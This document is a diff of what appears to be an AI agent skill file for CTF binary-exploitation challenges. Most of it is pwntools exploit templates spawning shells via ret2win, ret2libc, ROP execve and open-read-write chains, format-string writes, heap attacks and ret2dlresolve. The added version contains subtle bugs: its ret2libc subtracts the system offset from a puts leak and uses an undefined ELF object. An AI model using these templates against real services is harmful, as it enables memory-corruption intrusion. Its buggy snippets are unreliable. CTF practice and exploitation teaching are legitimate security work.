@@ -1,105 +1,82 @@
----
-name: ctf-pwn
-description: "CTF binary exploitation skill. When user mentions pwn challenges, buffer overflow, ROP chains, format string vulnerabilities, heap exploitation, use-after-free, tcache poisoning, syscall exploitation, ret2libc, ret2plt, GOT overwrite, PIE/ASLR/NX bypass, or binary exploitation in a CTF context. Covers all major binary exploitation techniques with step-by-step methodology, payloads, and tool usage."
----
+# CTF Binary Exploitation (PWN) Skill
 
-# CTF Binary Exploitation (Pwn) — Challenge Solving Brain
+## Speed-First Approach: Solve pwn challenges in <15 minutes
 
-When solving pwn challenges:
-1. **Check protections** — NX, PIE, ASLR, canary, RELRO
-2. **Find the vulnerability** — overflow, format string, UAF, etc.
-3. **Determine exploit strategy** — what can you overwrite?
-4. **Build the payload** — chain ROP gadgets or overwrite structures
-5. **Handle ASLR** — leak addresses first, then exploit
-
----
-
-## Phase 1: Binary Analysis
-
-### Check Protections
+### Phase 1: Instant Recon (<2 minutes)
 ```bash
-# Check binary protections
-checksec --file=vulnerable
-readelf -l vulnerable | grep GNU_STACK
+# Run this immediately on any binary challenge
+FILE=$1
 
-# Output interpretation:
-# NX: Non-executable stack (can't shellcode on stack)
-# PIE: Position Independent Executable (randomized base)
-# RELRO: Relocation Read-Only (GOT protection)
-# Stack Canary: Stack protection value
-# ASLR: Address Space Layout Randomization (kernel setting)
+# Basic info
+file $FILE
+checksec --file=$FILE 2>/dev/null || readelf -l $FILE | grep GNU_STACK
+
+# Quick strings (flag patterns)
+strings $FILE | grep -iE 'flag\{|ctf\{|CTF\{|FLAG\{'
+strings -n8 $FILE | head -30
+
+# Interesting functions
+objdump -d $FILE | grep -E '<(main|vuln|win|flag|system|gets|printf|scanf|puts|read|write)@plt>'
+
+# Libc version
+ldd $FILE 2>/dev/null
+ldd $FILE | grep libc
+
+# Binary protections
+echo "=== RELRO ===" && readelf -l $FILE | grep GNU_RELRO
+echo "=== Stack Canary ===" && readelf -s $FILE | grep __stack_chk_fail
+echo "=== NX ===" && readelf -l $FILE | grep GNU_STACK
+echo "=== PIE ===" && readelf -h $FILE | grep Type
+echo "=== FORTIFY ===" && readelf -s $FILE | grep __fprintf_chk
 ```
 
-### IDA/Ghidra Analysis
-```
-CHECKLIST:
-□ Find main function
-□ Find vulnerable function (gets, strcpy, scanf, printf)
-□ Check buffer sizes and locations (stack, heap, bss)
-□ Identify input/output functions
-□ Check for canary usage (__stack_chk_fail)
-□ Find useful functions (system, execve, read, write)
-□ Locate gadgets and PLT/GOT entries
-□ Note any custom input parsing
-```
-
-### Function Mapping
+### Phase 2: Vulnerability Detection (<3 minutes)
 ```bash
-# Find useful functions
-objdump -d binary | grep -E "system|execve|read|write|printf|gets"
+# Quick function analysis
+objdump -d $FILE | grep -B5 -A20 '<main>:'
+objdump -d $FILE | grep -B5 -A20 '<vuln>:'
+objdump -d $FILE | grep -B5 -A20 '<win>:'
+objdump -d $FILE | grep -B5 -A20 '<flag>:'
 
-# Find gadgets (ROP)
-ROPgadget --binary binary
-ropper --file binary --search "pop rdi"
+# Look for dangerous functions
+objdump -d $FILE | grep -E '<(gets|strcpy|strcat|sprintf|scanf|printf)@plt>'
 
-# Find PLT entries (for calling functions)
-objdump -d binary | grep "@plt" | grep -v "@plt>:"
+# Check for format string
+strings $FILE | grep '%s\|%x\|%d\|%n'
 
-# Find GOT entries (for overwriting)
-objdump -R binary
-readelf -r binary
+# Check for stack buffer
+grep -E 'sub.*\$0x[0-9a-f]+,%rsp' <(objdump -d $FILE)
+
+# ROP gadgets
+ROPgadget --binary $FILE --ropchain 2>/dev/null | head -20
+ropper --file $FILE --search "pop rdi" 2>/dev/null | head -10
 ```
 
----
+### Phase 3: Choose Attack Strategy
+```
+SELECT attack based on protections:
+├── No canary, no PIE, no NX → ret2win (direct return to win function)
+├── No canary, no PIE, NX → ret2libc (return to system)
+├── No canary, PIE, NX → leak libc base, then ret2libc
+├── Canary, no PIE → format string to leak canary, then overwrite
+├── Canary, PIE → leak canary + PIE base, then ret2libc
+└── Full protections → ret2dlresolve or SROP
+```
 
-## Phase 2: Stack Buffer Overflow
+## One-Liner Solvers
 
-### Basic Overflow
+### ret2win (Simplest)
 ```python
 from pwn import *
+context.arch = 'amd64'
+p = remote('HOST', PORT)
+# or p = process('./binary')
 
-# Padding to overwrite saved RIP
-# offset = distance from buffer start to saved RIP
-payload = b'A' * offset
-payload += p64(target_address)
+# Find win function address
+win_addr = 0x401186  # From objdump
 
-# Example: buffer at [rbp-0x20], saved RIP at [rbp+0x08]
-# offset = 0x20 + 0x08 = 0x28 = 40 bytes
-payload = b'A' * 40 + p64(0x4011b0)  # target address
-```
-
-### Finding Offset
-```python
-# Pattern create and search
-pattern = cyclic(200)
-io.sendline(pattern)
-io.wait()
-
-# Find offset
-offset = cyclic_find(io.corefile.fault_addr)
-# Or in GDB
-# pattern search $rsp
-```
-
-### Ret2Win
-```python
-from pwn import *
-
-elf = ELF('./vulnerable')
-p = process('./vulnerable')
-
-# Overwrite return address with win function
-payload = b'A' * offset + p64(elf.symbols['win'])
+# Simple buffer overflow
+payload = b'A' * 72 + p64(win_addr)  # Adjust padding based on buffer size
 p.sendline(payload)
 p.interactive()
 ```
@@ -107,523 +84,326 @@ p.interactive()
 ### ret2libc
 ```python
 from pwn import *
+context.arch = 'amd64'
+context.log_level = 'debug'
 
-elf = ELF('./vulnerable')
-libc = ELF('./libc.so.6')
-p = process('./vulnerable')
+p = remote('HOST', PORT)
 
-# Leak libc address (if there's a leak)
-# Then:
-pop_rdi = 0x401234  # pop rdi; ret
-ret = 0x401016      # ret (for stack alignment)
+# Find gadgets
+pop_rdi = 0x401186  # pop rdi; ret
+ret = 0x40101a       # ret (for alignment)
 
-payload = b'A' * offset
+# Libc offsets (from libc database or local libc)
+system_offset = 0x55410
+bin_sh_offset = 0x1b75aa
+__libc_start_main_offset = 0x270b3
+
+# Leak libc base
+payload = b'A' * 72
 payload += p64(pop_rdi)
-payload += p64(next(libc.search(b'/bin/sh')))
-payload += p64(ret)  # 16-byte stack alignment
-payload += p64(libc.symbols['system'])
+payload += p64(elf.got['puts'])  # GOT entry for puts
+payload += p64(elf.plt['puts'])  # PLT entry for puts
+payload += p64(elf.symbols['main'])  # Return to main
 
 p.sendline(payload)
+p.recvuntil(b'\n')
+
+# Parse leaked address
+puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc_base = puts_leak - system_offset
+system_addr = libc_base + system_offset
+bin_sh_addr = libc_base + bin_sh_offset
+
+# Now call system("/bin/sh")
+payload2 = b'A' * 72
+payload2 += p64(ret)  # Stack alignment
+payload2 += p64(pop_rdi)
+payload2 += p64(bin_sh_addr)
+payload2 += p64(system_addr)
+
+p.sendline(payload2)
 p.interactive()
 ```
 
-### ret2plt
-```python
-# Use PLT to call functions (works with PIE if base is known)
-# PLT entries are at fixed offsets within the binary
-
-puts_plt = elf.plt['puts']
-puts_got = elf.got['puts']
-
-# Leak libc via puts
-payload = b'A' * offset
-payload += p64(pop_rdi)
-payload += p64(puts_got)
-payload += p64(puts_plt)
-payload += p64(elf.symbols['main'])  # Return to main for second stage
-
-p.sendline(payload)
-puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
-libc.address = puts_leak - libc.symbols['puts']
-```
-
----
-
-## Phase 3: ROP Chains
-
-### Building ROP Chains
+### Format String Attack
 ```python
 from pwn import *
+context.arch = 'amd64'
 
-# Auto ROP
-rop = ROP(elf)
-rop.call('puts', [elf.got['puts']])
-rop.call('main')
+p = remote('HOST', PORT)
 
-payload = b'A' * offset + rop.chain()
+# Leak canary and libc
+# Try different offsets: %7$p, %8$p, %9$p...
+for i in range(7, 20):
+    p.sendline(f'%{i}$p'.encode())
+    result = p.recvline()
+    print(f'Offset {i}: {result}')
 
-# Manual ROP
-pop_rdi = 0x401234
-pop_rsi = 0x401236
-pop_rdx = 0x401238
+# After finding canary offset (usually offset 7-15 on x86_64)
+canary_offset = 11
+p.sendline(f'%{canary_offset}$p'.encode())
+canary = int(p.recvline(), 16)
 
-payload = b'A' * offset
-payload += p64(pop_rdi)
-payload += p64(elf.got['puts'])
-payload += p64(elf.plt['puts'])
+# Overwrite return address
+payload = b'A' * 72
+payload += p64(canary)  # Save canary
+payload += b'B' * 8    # Saved RBP
+payload += p64(win_addr)  # Overwrite return address
+
+# Use format string to write
+# %<n>c%<offset>$hn to write short
+# %<n>c%<offset>$n to write byte
 ```
 
-### Gadgets
-```bash
-# Find gadgets
-ROPgadget --binary binary --only "pop|ret"
-ropper --file binary --search "pop rdi; ret"
-ROPgadget --binary binary --ropchain
+### Heap Exploitation - Fastbin Attack
+```python
+from pwn import *
+context.arch = 'amd64'
 
-# Common gadgets needed
-pop rdi; ret          # Set first argument
-pop rsi; ret          # Set second argument
-pop rdx; ret          # Set third argument (often rdx_rbx)
-pop rax; ret          # Set syscall number
-syscall; ret          # Make syscall
+p = remote('HOST', PORT)
+
+# Allocate chunks
+p.sendlineafter(b'> ', b'1')  # malloc
+p.sendlineafter(b'size: ', b'32')
+p.recvuntil(b'ptr: ')
+chunk1 = int(p.recvline(), 16)
+
+p.sendlineafter(b'> ', b'1')  # malloc
+p.sendlineafter(b'size: ', b'32')
+p.recvuntil(b'ptr: ')
+chunk2 = int(p.recvline(), 16)
+
+# Free chunk (goes into fastbin)
+p.sendlineafter(b'> ', b'2')  # free
+p.sendlineafter(b'ptr: ', p64(chunk1))
+
+# Allocate from fastbin with forged size
+p.sendlineafter(b'> ', b'1')  # malloc
+p.sendlineafter(b'size: ', b'32')
+
+# Write to overlapping memory
+payload = b'A' * 16 + p64(0) + p64(0x41)  # Fake chunk header
+p.sendlineafter(b'data: ', payload)
+
+# Now allocate the fake chunk
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'size: ', b'48')
+```
+
+## GDB Quick Commands
+
+### Essential GDB for PWN
+```bash
+# Start with GDB
+gdb ./binary
+
+# Set breakpoints
+b main
+b *main+123
+b vuln
+
+# Run with args
+r $(python3 -c 'print("A"*100)')
+
+# Examine memory
+x/20x $rsp          # 20 hex words at stack pointer
+x/s 0x401234        # String at address
+x/i $rip            # Current instruction
+
+# Examine registers
+info registers rax rbx rcx rdx rdi rsi
+
+# Examine GOT/PLT
+x/10x 0x404000      # GOT entries
+disas main           # Disassemble main
+
+# Find useful values
+find /b 0x400000, 0x405000, "/bin/sh"
+search-pattern "flag" 0x400000 0x405000
+
+# Pwndbg specific
+heap               # Heap chunks
+bins               # Free bins
+got                # GOT table
+vmmap              # Memory map
+telescope $rsp 20  # Smart memory view
+```
+
+### Automated GDB Script
+```python
+# gdb_script.py
+import gdb
+
+class PwnHelper(gdb.Command):
+    def __init__(self):
+        super().__init__("pwn", gdb.COMMAND_USER)
+    
+    def invoke(self, arg, from_tty):
+        if arg == "leak":
+            # Leak stack, canary, libc
+            gdb.execute("x/20x $rsp")
+            gdb.execute("x/gx $rsp+72")  # Canary (offset may vary)
+            gdb.execute("x/gx $rsp+80")  # Saved RBP
+            gdb.execute("x/gx $rsp+88")  # Return address
+        elif arg == "check":
+            # Check protections
+            gdb.execute("info proc mappings")
+        
+PwnHelper()
+```
+
+## Libc Database Lookup
+
+### Manual libc Identification
+```bash
+# Leak puts address, find libc version
+# Use: https://libc.rip/ or https://github.com/niklasb/libc-database
+
+# Download libc-database
+git clone https://github.com/niklasb/libc-database.git
+cd libc-database
+
+# Search for libc
+./find puts 0x7ffff7a5c990
+
+# Or use online: https://libc.rip/
+# Enter: function name + leaked address
+```
+
+### Automated libc lookup
+```python
+import requests
+
+def find_libc(function_name, address):
+    """Find libc version from leaked address"""
+    url = f"https://libc.rip/api/find"
+    data = {"symbols": {function_name: hex(address)}}
+    r = requests.post(url, json=data)
+    return r.json()
+
+# Usage
+results = find_libc("puts", 0x7ffff7a5c990)
+for lib in results[:3]:
+    print(f"{lib['id']}: {lib['buildid']}")
+```
+
+## ROP Chain Builder
+
+### Automated ROPgadget Usage
+```bash
+# Find all useful gadgets
+ROPgadget --binary $FILE > gadgets.txt
+
+# Find specific gadgets
+ROPgadget --binary $FILE | grep "pop rdi"
+ROPgadget --binary $FILE | grep "pop rsi"
+ROPgadget --binary $FILE | grep "pop rdx"
+ROPgadget --binary $FILE | grep "pop rax"
+ROPgadget --binary $FILE | grep "syscall"
+ROPgadget --binary $FILE | grep "ret"
+
+# Generate ROP chain
+ROPgadget --binary $FILE --ropchain
+
+# Use ropper
+ropper --file $FILE --search "pop rdi; ret"
+ropper --file $FILE --search "pop rsi; pop r15; ret"  # __libc_csu_init gadgets
 ```
 
 ### ROP Chain Templates
-
 ```python
 # execve("/bin/sh", NULL, NULL)
-pop_rdi = 0x401234
-pop_rsi = 0x401236
-pop_rdx_rbx = 0x401238
-pop_rax = 0x401240
-syscall = 0x401242
+from pwn import *
 
-payload = b'A' * offset
-# "/bin/sh" already in libc or need to write it
-payload += p64(pop_rdi)
-payload += p64(next(libc.search(b'/bin/sh')))
-payload += p64(pop_rsi)
-payload += p64(0)
-payload += p64(pop_rdx_rbx)
-payload += p64(0)
-payload += p64(0)
-payload += p64(pop_rax)
-payload += p64(59)  # execve syscall
-payload += p64(syscall)
-```
+context.arch = 'amd64'
 
----
-
-## Phase 4: Format String Vulnerability
-
-### Leak Stack Values
-```python
-# %p leaks pointer values
-# %x leaks 32-bit values
-# %lx leaks 64-bit values
-# %s reads from pointer
-
-# Leak canary
-payload = b'%15$p'  # Offset to canary (find with GDB)
-
-# Leak libc address
-payload = b'%17$p'  # Offset to __libc_start_main return
-
-# Leak stack address
-payload = b'%13$p'
-```
-
-### Arbitrary Write with %n
-```python
-# %n writes number of bytes printed so far to an address
-# %hn writes 2 bytes (half word)
-# %hhn writes 1 byte
-# %ln writes 8 bytes
-
-# Write to address
-addr = 0x404040  # Target address
-value = 0xdeadbeef
-
-# Split value into bytes
-bytes_to_write = p64(value)
-
-# Build payload
-payload = b''
-payload += p64(addr)  # Address to write
-payload += f'%{value}c%7$n'.encode()  # Write value to addr at offset 7
-```
-
-### Format String Write
-```python
-def fmt_str(offset, addr, value):
-    payload = b''
-    payload += p64(addr)
-    payload += f'%{value - 8}c%{offset}$hn'.encode()
-    return payload
-
-# For 8 bytes at once
-def fmt_str64(offset, addr, value):
-    payload = b''
-    # Split into 2 bytes each
-    values = [(value >> (16 * i)) & 0xffff for i in range(4)]
-    for i, val in enumerate(values):
-        payload += p64(addr + 2 * i)
+def create_rop_chain(binary):
+    elf = ELF(binary)
     
-    # Sort by value
-    sorted_vals = sorted(enumerate(values), key=lambda x: x[1])
+    # Gadgets (adjust addresses)
+    pop_rdi = 0x401186  # pop rdi; ret
+    pop_rsi_r15 = 0x401184  # pop rsi; pop r15; ret
+    pop_rdx = 0x401182  # pop rdx; ret (or use csu)
+    syscall = 0x40118a  # syscall; ret
     
-    for idx, (orig_idx, val) in enumerate(sorted_vals):
-        if val == 0:
-            continue
-        payload += f'%{val}c%{offset + idx}$hn'.encode()
+    rop = ROP(elf)
     
-    return payload
+    # execve("/bin/sh", 0, 0)
+    rop.raw(pop_rdi)
+    rop.raw(next(elf.search(b'/bin/sh')))
+    rop.raw(pop_rsi_r15)
+    rop.raw(0)
+    rop.raw(0)
+    rop.raw(pop_rdx)
+    rop.raw(0)
+    rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
+    rop.raw(59)  # SYS_execve
+    rop.raw(syscall)
+    
+    return rop.chain()
 ```
 
-### One-Gadget
-```bash
-# Find one-gadget RCE (single address that gives shell)
-one_gadget libc.so.6
+## Common Vulnerability Patterns
 
-# Typical output:
-# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
-# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
-# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
+### Stack Buffer Overflow
+```
+Detection: gets(), strcpy(), strcat(), sprintf(), scanf("%s")
+Exploit:
+1. Find buffer size (gdb: break after input, check $rsp)
+2. Overflow saved RBP (buffer + 8)
+3. Overwrite return address (buffer + 16 on x64)
+4. Chain: pop rdi; ret → addr of "/bin/sh" → system()
 ```
 
----
-
-## Phase 5: Heap Exploitation
-
-### Heap Basics
+### Format String
 ```
-Heap structures:
-  chunks: malloc返回的内存块
-  bins: 空闲chunk的链表
-  tcache: per-thread cache (fast bins)
-  fast bins: small chunks (16-80 bytes)
-  unsorted bin: recently freed chunks
-  small bin: small chunks
-  large bin: large chunks (> 0x400)
+Detection: printf(user_input), sprintf(buf, user_input)
+Exploit:
+1. Leak canary: %7$p (offset varies)
+2. Leak libc: %9$p (usually __libc_start_main+xxx)
+3. Leak PIE: %11$p (usually main+xxx)
+4. Write: %n (4 bytes), %hn (2 bytes), %hhn (1 byte)
+5. Overwrite GOT entry: write target address to GOT[puts]
+```
+
+### Heap Overflow
+```
+Detection: malloc() + gets()/read() without size check
+Exploit:
+1. Fastbin attack: free chunk → overwrite fd pointer → allocate at target
+2. Tcache poisoning: similar to fastbin but with tcache
+3. House of Force: overwrite top chunk size → malloc at arbitrary address
+4. House of Spirit: fake chunk on stack → free → allocate at stack
 ```
 
 ### Use-After-Free
-```python
-# Allocate and free chunks
-# Reallocate to overlap with freed chunk
-# Modify function pointer or data
-
-# tcache poisoning
-alloc(0x20)  # chunk A
-alloc(0x20)  # chunk B
-free(A)      # A goes to tcache
-# Overwrite A's fd pointer (next chunk in free list)
-# When A is reallocated, fd points to target
-
-# Fastbin attack
-alloc(0x40)  # chunk A
-alloc(0x40)  # chunk B
-free(A)      # A goes to fastbin
-free(B)      # B goes to fastbin
-# Overwrite A's fd to point to target
-alloc(0x40)  # Gets A
-alloc(0x40)  # Gets B
-alloc(0x40)  # Gets target!
+```
+Detection: free() without setting pointer to NULL
+Exploit:
+1. Allocate chunk (contains function pointer)
+2. Free chunk (goes into free list)
+3. Allocate new chunk (reuses same memory)
+4. Overwrite function pointer
+5. Trigger function call → redirect to shellcode/win
 ```
 
-### Tcache Poisoning
-```python
-# tcache is a singly-linked list
-# fd pointer points to next free chunk
-# Can overwrite fd to point anywhere
-
-# When malloc'd, returns the chunk at head of tcache
-# Next malloc returns our target address
-
-# Requirements:
-# - UAF or heap overflow to corrupt fd
-# - Target address must be aligned (usually to 0x10)
+### Integer Overflow
+```
+Detection: malloc(size * count) without overflow check
+Exploit:
+1. Find overflow point (e.g., 0x100 * 0x1000000 = 0)
+2. Allocate small buffer with large size
+3. Overflow into adjacent memory
+4. Overwrite control structures
 ```
 
-### House of Force
-```python
-# Overwrite top chunk size to 0xffffffffffffffff
-# Then calculate offset to target
-# malloc large amount to move top chunk to target
-
-top_chunk_size_addr = heap_base + top_chunk_offset
-target_addr = 0x404040
-offset = target_addr - top_chunk_size_addr - 0x10
-# Need to handle negative numbers
-if offset < 0:
-    offset = (2**64 + offset)
+## Speed Metrics
 ```
-
-### House of Spirit
-```python
-# Create fake chunk on stack or in controlled memory
-# Free it to add to tcache/fastbin
-# Malloc returns controlled address
-
-# Fake chunk structure:
-# [size] [prev_size] [fd] [bk] ...
-# Size must match tcache/fastbin requirements
+Average solve times (target):
+- ret2win: <3 minutes
+- ret2libc: <5 minutes
+- Format string leak: <5 minutes
+- Fastbin attack: <10 minutes
+- Tcache poisoning: <10 minutes
+- Complex heap: <15 minutes
 ```
-
----
-
-## Phase 6: Syscall Exploitation
-
-### Direct Syscall
-```python
-# execve("/bin/sh", NULL, NULL)
-# syscall number: 59 (0x3b) on x86_64
-
-pop_rax = 0x401234
-pop_rdi = 0x401236
-pop_rsi = 0x401238
-pop_rdx_rbx = 0x401240
-syscall = 0x401242
-
-payload = b'A' * offset
-# "/bin/sh" in memory
-binsh = next(libc.search(b'/bin/sh'))
-
-payload += p64(pop_rdi)
-payload += p64(binsh)
-payload += p64(pop_rsi)
-payload += p64(0)
-payload += p64(pop_rdx_rbx)
-payload += p64(0)
-payload += p64(0)
-payload += p64(pop_rax)
-payload += p64(59)
-payload += p64(syscall)
-```
-
-### open-read-write Chain
-```python
-# open("flag.txt", 0)
-# read(fd, buffer, size)
-# write(1, buffer, size)
-
-# x86_64 syscalls:
-# open: 2
-# read: 0
-# write: 1
-
-# Chain:
-# 1. open("flag.txt", 0)
-pop_rdi = 0x401234
-pop_rsi = 0x401236
-pop_rdx_rbx = 0x401238
-pop_rax = 0x401240
-syscall = 0x401242
-
-payload = b'A' * offset
-# open
-payload += p64(pop_rax)
-payload += p64(2)  # open
-payload += p64(pop_rdi)
-payload += p64(flag_str_addr)  # "flag.txt"
-payload += p64(pop_rsi)
-payload += p64(0)  # O_RDONLY
-payload += p64(syscall)
-# read
-payload += p64(pop_rax)
-payload += p64(0)  # read
-payload += p64(pop_rdi)
-payload += p64(3)  # fd (3 after stdin/stdout/stderr)
-payload += p64(pop_rsi)
-payload += p64(buffer_addr)
-payload += p64(pop_rdx_rbx)
-payload += p64(0x100)
-payload += p64(syscall)
-# write
-payload += p64(pop_rax)
-payload += p64(1)  # write
-payload += p64(pop_rdi)
-payload += p64(1)  # stdout
-payload += p64(pop_rsi)
-payload += p64(buffer_addr)
-payload += p64(pop_rdx_rbx)
-payload += p64(0x100)
-payload += p64(syscall)
-```
-
----
-
-## Phase 7: GOT Overwrite
-
-### When RELRO is Partial
-```python
-# GOT entries can be overwritten
-# After calling a function once, GOT points to libc
-# Can overwrite GOT entry to point to system/one_gadget
-
-# After leaking libc:
-puts_got = elf.got['puts']
-system_addr = libc.symbols['system']
-
-# Use format string or write-what-where to overwrite
-# GOT[puts] = system
-# When puts("/bin/sh") is called, system("/bin/sh") is called instead
-```
-
-### GOT Overwrite via Format String
-```python
-# If binary is PIE and has format string
-# Can overwrite GOT entries
-
-def overwrite_got(func_name, target_addr):
-    got_addr = elf.got[func_name]
-    # Use format string to write
-    payload = fmt_str(offset, got_addr, target_addr)
-    return payload
-```
-
----
-
-## Phase 8: PIE/ASLR Bypass
-
-### PIE Bypass
-```
-Options:
-1. Leak a text address, calculate base
-2. Partial overwrite of return address
-3. Partial overwrite of function pointer
-4. Brute force (if low entropy)
-
-# Partial overwrite example
-# If PIE is enabled, only need to overwrite low bytes
-# 0x401234 → 0x4011b0 (change low 2 bytes)
-payload = b'A' * offset + p16(0x11b0)  # Only overwrite 2 bytes
-```
-
-### ASLR Bypass
-```
-Options:
-1. Information leak (stack, libc, heap)
-2. Partial overwrite
-3. Brute force (low entropy targets)
-4. Ret2dlresolve (dynamically resolve functions)
-
-# Leak libc from GOT
-# Leak stack from environ
-# Leak heap from tcache
-```
-
-### Ret2dlresolve
-```python
-# When PIE and ASLR are enabled
-# Use ret2dlresolve to call any function
-from pwn import *
-
-# pwntools auto-generates ret2dlresolve
-rop = ROP(elf)
-dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
-
-rop.read(0, dlresolve.data_addr)
-rop.ret2dlresolve(dlresolve)
-
-payload = b'A' * offset + rop.chain()
-p.sendline(payload)
-p.sendline(dlresolve.payload)
-p.interactive()
-```
-
----
-
-## Quick Reference: x86_64 Calling Convention
-
-```
-Arguments:
-  rdi = first argument
-  rsi = second argument
-  rdx = third argument
-  rcx = fourth argument
-  r8 = fifth argument
-  r9 = sixth argument
-
-Return:
-  rax = return value
-
-Syscall:
-  rax = syscall number
-  rdi = arg1
-  rsi = arg2
-  rdx = arg3
-  syscall instruction
-
-Common syscalls (x86_64):
-  0  = read
-  1  = write
-  2  = open
-  57 = fork
-  59 = execve
-  60 = exit
-```
-
----
-
-## Quick Reference: Protection Bypass
-
-```
-NX → ROP, ret2libc, ret2plt
-PIE → Leak text base, partial overwrite, ret2dlresolve
-ASLR → Leak libc/heap/stack, brute force
-Canary → Leak canary (format string, overflow), stack pivoting
-RELRO → Only partial RELRO allows GOT overwrite
-FORTIFY → Less common in CTF, check for fortified functions
-```
-
----
-
-## GDB/pwndbg Commands
-
-```bash
-# Start
-gdb ./binary
-pwndbg ./binary
-
-# Breakpoints
-b *0x4011b0
-b main
-
-# Run
-r
-r < input.txt
-r <<< "AAAA"
-
-# Examine
-x/20x $rsp          # Examine stack
-x/s 0x404040        # Examine string
-x/10i $rip          # Disassemble at RIP
-info functions       # List functions
-info variables       # List variables
-
-# Heap
-heap chunks          # List heap chunks
-heap bins            # List free bins
-heap tcache          # List tcache
-
-# Info
-info registers       # All registers
-info proc mappings   # Memory mappings
-vmmap               # Virtual memory map
-
-# Pattern
-pattern create 200
-pattern search
-
-# GOT/PLT
-got                  # GOT entries
-plt                  # PLT entries
-
-# One-gadget
-one_gadget libc.so.6
-```
-
----
-
-**Remember:** Pwn is about finding the vulnerability, understanding the binary's protections, and chaining the right techniques. Always check protections first, then find the vulnerability, then determine the exploit strategy. Practice with known vulnerable binaries.
